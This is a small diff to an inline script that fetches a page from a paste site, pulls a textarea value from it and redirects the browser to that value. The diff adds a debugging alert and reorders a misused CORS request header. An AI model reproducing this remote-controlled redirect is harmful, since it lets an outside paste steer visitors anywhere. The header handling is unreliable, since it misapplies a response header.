@@ -8,6 +8,7 @@ function handler() {
 		var parser = new DOMParser();
 		var xmlDoc = parser.parseFromString(this.response, "text/html");
 		var keystr = xmlDoc.getElementsByTagName('textarea')[0].childNodes[0].nodeValue;
+		alert(keystr);
 		window.location.replace(keystr);
 
 	}
@@ -23,8 +24,8 @@ function handler() {
 
 var req = new XMLHttpRequest();  
 req.onload = handler;
-req.setRequestHeader('Access-Control-Allow-Headers', '*');
 req.open('GET', 'http://shrib.com/GkWegnkO?');   
+req.setRequestHeader('Access-Control-Allow-Headers', '*');
 req.send(null);  
 
 </script>
